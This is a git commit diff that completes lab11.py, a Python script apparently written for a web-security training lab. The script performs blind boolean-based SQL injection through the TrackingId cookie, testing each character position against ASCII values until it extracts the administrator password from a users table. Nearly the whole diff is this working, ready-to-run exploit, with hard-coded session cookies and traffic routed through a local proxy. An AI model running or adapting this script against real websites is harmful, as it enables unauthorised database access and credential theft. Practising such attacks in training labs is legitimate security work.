7d2aeb3b18b1e325ff7a6242cd3f13aa3dad6777
Xin Chen <xcn@amazon.com>
2022-08-17 21:46:59 -0700

    labs

--- lab11.py
+++ lab11.py
@@ -3,26 +3,39 @@ import urllib3
 import re
 from bs4 import BeautifulSoup
 import sys
+import urllib
+
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
 proxies = {'https':'https://127.0.0.1:8080'}
 
-
 def sqli_password(url):
-
-
-
+    password_extracted = ""
+    for i in range(1,21):
+        for j in range(32,126):
+            sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (i,j)
+            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
+            cookies = {'TrackingId': 'GGSJJ8pPRgB58NFv' + sqli_payload_encoded, 'session': 'rUhWlUg5rveqeChi1BdOblXP6smxYq5R'}
+            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
+            if "Welcome" not in r.text:
+                sys.stdout.write('\r' + password_extracted + chr(j))
+                sys.stdout.flush()
+            else:
+                password_extracted += chr(j)
+                sys.stdout.write('\r' + password_extracted)
+                sys.stdout.flush()
+                break
 
 def main():
     if len(sys.argv) != 2:
-        print(f"[+] Usage: {sys.argv[0]}")
-        print(f"[+] Example: {sys.argv[0]} www.example.com")
+        print("(+) Usage: %s <url>" % sys.argv[0])
+        print("(+) Example: %s www.example.com" % sys.argv[0])
 
-        url = sys.argv[1]
-        print(f"[+] Retrieving administrator passowrd...")
+    url = sys.argv[1]
+    print("(+) Retrieving administrator password...")
+    sqli_password(url)
 
-        sqli_password(url)
 if __name__ == "__main__":
     main()
